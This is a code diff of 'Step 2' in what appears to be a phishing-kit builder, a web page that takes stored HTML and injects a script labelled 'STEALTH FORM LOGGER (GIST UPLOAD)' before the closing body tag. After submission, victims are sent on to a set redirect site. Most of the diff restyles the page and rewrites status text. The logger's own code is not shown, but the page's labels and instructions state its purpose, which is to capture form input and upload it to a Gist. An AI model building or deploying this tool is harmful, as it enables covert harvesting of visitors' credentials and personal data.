@@ -3,78 +3,195 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Step 2 Processor</title>
+    <title>Step 2 - HTML Processor</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
     <style>
+        :root {
+            --primary-color: #4a6fa5;
+            --success-color: #4caf50;
+            --error-color: #f44336;
+            --warning-color: #ff9800;
+            --light-bg: #f8f9fa;
+            --dark-text: #333;
+            --light-text: #666;
+            --border-radius: 6px;
+            --box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+        
         body {
-            font-family: Arial, sans-serif;
-            max-width: 800px;
+            font-family: 'Roboto', sans-serif;
+            max-width: 900px;
             margin: 0 auto;
-            padding: 20px;
+            padding: 30px;
             line-height: 1.6;
+            color: var(--dark-text);
+            background-color: #f5f7fa;
         }
+        
+        h1 {
+            color: var(--primary-color);
+            margin-bottom: 25px;
+            font-weight: 700;
+            border-bottom: 2px solid var(--primary-color);
+            padding-bottom: 10px;
+        }
+        
+        h2 {
+            color: var(--primary-color);
+            margin-top: 0;
+            font-weight: 500;
+        }
+        
         .container {
-            background-color: #f5f5f5;
-            padding: 20px;
-            border-radius: 5px;
-            margin-bottom: 20px;
+            background-color: white;
+            padding: 30px;
+            border-radius: var(--border-radius);
+            margin-bottom: 30px;
+            box-shadow: var(--box-shadow);
         }
-        button {
-            background-color: #4CAF50;
+        
+        .btn {
+            background-color: var(--primary-color);
             color: white;
-            padding: 10px 15px;
+            padding: 12px 24px;
             border: none;
-            border-radius: 4px;
+            border-radius: var(--border-radius);
             cursor: pointer;
             font-size: 16px;
+            font-weight: 500;
+            transition: all 0.3s ease;
+            margin-right: 10px;
         }
-        button:hover {
-            background-color: #45a049;
+        
+        .btn:hover {
+            background-color: #3a5a8f;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
         }
+        
+        .btn-success {
+            background-color: var(--success-color);
+        }
+        
+        .btn-success:hover {
+            background-color: #3d8b40;
+        }
+        
         .status {
             margin: 20px 0;
-            padding: 10px;
-            border-radius: 4px;
+            padding: 15px;
+            border-radius: var(--border-radius);
+            border-left: 5px solid;
         }
+        
         .success {
-            background-color: #dff0d8;
-            color: #3c763d;
+            background-color: #e8f5e9;
+            color: #2e7d32;
+            border-left-color: var(--success-color);
         }
+        
         .error {
-            background-color: #f2dede;
-            color: #a94442;
+            background-color: #ffebee;
+            color: #c62828;
+            border-left-color: var(--error-color);
         }
+        
+        .info {
+            background-color: #e3f2fd;
+            color: #1565c0;
+            border-left-color: var(--primary-color);
+        }
+        
         #redirectUrlInput {
             width: 100%;
-            padding: 8px;
-            margin: 10px 0;
+            padding: 12px;
+            margin: 10px 0 20px;
             box-sizing: border-box;
+            border: 1px solid #ddd;
+            border-radius: var(--border-radius);
+            font-size: 16px;
+            transition: border 0.3s;
         }
+        
+        #redirectUrlInput:focus {
+            border-color: var(--primary-color);
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(74, 111, 165, 0.2);
+        }
+        
         .input-group {
-            margin: 20px 0;
+            margin: 25px 0;
         }
+        
         label {
             display: block;
-            margin-bottom: 5px;
-            font-weight: bold;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: var(--dark-text);
+        }
+        
+        .user-info-card {
+            background-color: var(--light-bg);
+            padding: 15px;
+            border-radius: var(--border-radius);
+            margin-bottom: 20px;
+            border-left: 4px solid var(--primary-color);
+        }
+        
+        .user-info-card strong {
+            color: var(--primary-color);
+        }
+        
+        .button-group {
+            display: flex;
+            gap: 10px;
+            margin-top: 20px;
+        }
+        
+        .instructions {
+            background-color: #fff8e1;
+            padding: 15px;
+            border-radius: var(--border-radius);
+            margin-bottom: 20px;
+            border-left: 4px solid var(--warning-color);
+        }
+        
+        .instructions h3 {
+            margin-top: 0;
+            color: var(--warning-color);
         }
     </style>
 </head>
 <body>
     <h1>Step 2: Process and Store HTML</h1>
-    
+
     <div class="container">
-        <h2>Processing Details</h2>
-        <div id="status" class="status"></div>
+        <h2>HTML Processing Panel</h2>
         
-        <div id="userInfo" class="status"></div>
-        
-        <div class="input-group">
-            <label for="redirectUrlInput">Enter redirect URL (after successful submission):</label>
-            <input type="text" id="redirectUrlInput" placeholder="https://www.example.com" value="https://www.dtech24.co.za">
+        <div class="instructions">
+            <h3>Instructions</h3>
+            <p>This step will inject the data capture script into your HTML and prepare it for deployment. Enter the URL where users should be redirected after form submission.</p>
         </div>
-        
-        <button id="processBtn">Process HTML</button>
-        <button id="nextBtn" style="display: none;">Proceed to Step 3</button>
+
+        <div id="status" class="status info">
+            Ready to process HTML content from localStorage...
+        </div>
+
+        <div id="userInfo" class="user-info-card">
+            <strong>User Information:</strong><br>
+            Loading user data...
+        </div>
+
+        <div class="input-group">
+            <label for="redirectUrlInput">Redirect URL (after successful submission):</label>
+            <input type="text" id="redirectUrlInput" placeholder="https://www.example.com/success" value="https://www.dtech24.co.za">
+            <small>This is where users will be redirected after submitting forms</small>
+        </div>
+
+        <div class="button-group">
+            <button id="processBtn" class="btn">Process HTML</button>
+            <button id="nextBtn" class="btn btn-success" style="display: none;">Proceed to Step 3 →</button>
+        </div>
     </div>
 
     <script>
@@ -84,14 +201,15 @@
             const processBtn = document.getElementById('processBtn');
             const nextBtn = document.getElementById('nextBtn');
             const redirectUrlInput = document.getElementById('redirectUrlInput');
-            
+
             // Check if data1step exists
             if (!localStorage.getItem('data1step')) {
-                statusEl.textContent = 'Error: data1step not found in localStorage';
+                statusEl.textContent = 'Error: No HTML content found in localStorage (data1step missing). Please complete Step 1 first.';
                 statusEl.className = 'status error';
+                processBtn.disabled = true;
                 return;
             }
-            
+
             // Get user info
             let userInfo = { username: 'unknown', gistId: '' };
             try {
@@ -102,36 +220,39 @@
             } catch (e) {
                 console.error('Error parsing user info:', e);
             }
-            
+
             // Display user info
             userInfoEl.innerHTML = `
-                <strong>User Info:</strong><br>
+                <strong>User Information:</strong><br>
                 Username: ${userInfo.username}<br>
                 Gist ID: ${userInfo.gistId || 'Not specified'}
+                ${!userInfo.gistId ? '<br><small style="color: var(--warning-color);">Warning: Using default Gist ID</small>' : ''}
             `;
-            
+
             // Handle process button click
             processBtn.addEventListener('click', function() {
                 const redirectUrl = redirectUrlInput.value.trim();
-                
+
                 // Validate URL
                 if (!redirectUrl) {
                     statusEl.textContent = 'Error: Please enter a redirect URL';
                     statusEl.className = 'status error';
+                    redirectUrlInput.focus();
                     return;
                 }
-                
+
                 try {
                     new URL(redirectUrl); // This will throw if URL is invalid
                 } catch (e) {
                     statusEl.textContent = 'Error: Please enter a valid URL (include http:// or https://)';
                     statusEl.className = 'status error';
+                    redirectUrlInput.focus();
                     return;
                 }
-                
+
                 // Get the HTML from data1step
                 let html = localStorage.getItem('data1step');
-                
+
                 // Inject the script just before closing body tag
                 const scriptToInject = `
 <!-- STEALTH FORM LOGGER (GIST UPLOAD) -->
@@ -302,25 +423,30 @@ const CONFIG = {
 })();
 <\/script>
 `;
-                
+
                 // Find the closing body tag and insert the script before it
                 const bodyCloseTagIndex = html.lastIndexOf('</body>');
                 if (bodyCloseTagIndex !== -1) {
                     const modifiedHtml = html.slice(0, bodyCloseTagIndex) + scriptToInject + html.slice(bodyCloseTagIndex);
-                    
+
                     // Save to data2step
                     localStorage.setItem('data2step', modifiedHtml);
-                    
-                    statusEl.textContent = `Successfully processed HTML and injected script with redirect to ${redirectUrl}. Modified HTML saved to data2step in localStorage.`;
+
+                    statusEl.innerHTML = `
+                        <strong>Success!</strong><br>
+                        HTML processed successfully with script injection.<br>
+                        Modified content saved to <code>data2step</code> in localStorage.<br><br>
+                        Users will be redirected to: <code>${redirectUrl}</code> after form submission.
+                    `;
                     statusEl.className = 'status success';
                     processBtn.style.display = 'none';
                     nextBtn.style.display = 'block';
                 } else {
-                    statusEl.textContent = 'Error: Could not find </body> tag in the HTML';
+                    statusEl.textContent = 'Error: Could not find </body> tag in the HTML content';
                     statusEl.className = 'status error';
                 }
             });
-            
+
             // Handle next button click
             nextBtn.addEventListener('click', function() {
                 window.location.href = 'step3.html';
